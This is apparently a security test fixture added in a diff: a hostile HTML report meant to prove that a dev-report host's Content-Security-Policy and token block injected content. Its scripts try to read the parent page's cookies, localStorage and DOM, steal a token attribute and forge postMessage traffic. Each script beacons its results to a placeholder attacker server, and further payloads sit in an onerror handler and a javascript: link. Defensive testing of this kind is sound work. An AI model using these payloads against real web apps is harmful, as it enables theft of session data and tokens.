@@ -1,0 +1,52 @@
+<!-- <head><meta http-equiv="Content-Security-Policy" content="script-src *"></head> -->
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Hostile report - direct</title>
+<!-- The Gateway's shape check REFUSES this report (scripts and an inline handler). The proof hands it to the app's
+     host anyway, by answering the app's own request for the report's bytes, so what stops it is the host's
+     Content-Security-Policy and token - not the shape check. __EVIL__ is the proof's recording server. Every
+     script below reports what it managed to do, by attribute on the page and by a request to __EVIL__. -->
+<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline' 'unsafe-eval'">
+<script>
+  (function () {
+    var out = { ran: true };
+    function beacon(name, value) { try { new Image().src = "__EVIL__/beacon/direct-" + name + "?v=" + encodeURIComponent(String(value)); } catch (e) {} }
+    try { out.parentStorage = JSON.stringify(parent.localStorage); } catch (e) { out.parentStorage = "blocked"; }
+    try { out.parentCookie = parent.document.cookie; } catch (e) { out.parentCookie = "blocked"; }
+    try { out.parentDom = parent.document.body.innerHTML.slice(0, 200); } catch (e) { out.parentDom = "blocked"; }
+    try { out.ownStorage = String(localStorage.length); } catch (e) { out.ownStorage = "blocked"; }
+    try { out.ownCookie = document.cookie; } catch (e) { out.ownCookie = "blocked"; }
+    document.documentElement.setAttribute("data-hostile-script-ran", JSON.stringify(out));
+    beacon("script-ran", JSON.stringify(out));
+    // Watch for the note-taking script removing its token attribute, to read the token out of it.
+    new MutationObserver(function (records) {
+      records.forEach(function (r) {
+        if (r.attributeName === "data-dev-report-token") { document.documentElement.setAttribute("data-hostile-token", r.oldValue); beacon("token", r.oldValue); }
+      });
+    }).observe(document, { subtree: true, attributes: true, attributeOldValue: true });
+    var forged = { channel: "devthrottle.dev-report", version: 1 };
+    parent.postMessage(Object.assign({}, forged, { type: "send", token: "guessed",
+      payload: { items: [{ id: "n1", kind: "note", text: "FORGED BY THE DIRECT REPORT", anchor: { type: "element", selector: "p", quote: "" } }] } }), "*");
+    var ch = new MessageChannel();
+    ch.port1.onmessage = function (e) { beacon("port-message", JSON.stringify(e.data)); };
+    parent.postMessage(Object.assign({}, forged, { type: "ready", token: "guessed", payload: { questionIds: [] } }), "*", [ch.port2]);
+    ch.port1.postMessage(Object.assign({}, forged, { type: "send", token: "guessed",
+      payload: { items: [{ id: "forged-port-1", kind: "note", text: "FORGED OVER A PORT BY THE DIRECT REPORT", anchor: { type: "element", selector: "p", quote: "" } }] } }));
+    window.addEventListener("message", function (e) { beacon("window-message", JSON.stringify(e.data)); });
+  })();
+</script>
+<script nonce="guessed">new Image().src = "__EVIL__/beacon/direct-guessed-nonce-ran";</script>
+<script src="__EVIL__/beacon/direct-external-script"></script>
+</head>
+<body>
+<header data-dev-report="header" data-dev-report-status="done"><h1>Hostile report (direct)</h1></header>
+<section data-dev-report="summary"><p>Handed to the host without the shape check.</p></section>
+<section data-dev-report="questions"><p data-dev-report-no-questions>No questions - nothing needed from you.</p></section>
+<section data-dev-report="detail">
+  <p id="handler"><img src="missing.png" onerror="document.documentElement.setAttribute('data-hostile-handler-ran','yes');new Image().src='__EVIL__/beacon/direct-handler-ran'" alt=""></p>
+  <p><a id="link-js" href="javascript:void(new Image().src='__EVIL__/beacon/direct-javascript-url-ran')">A javascript: link</a></p>
+</section>
+</body>
+</html>
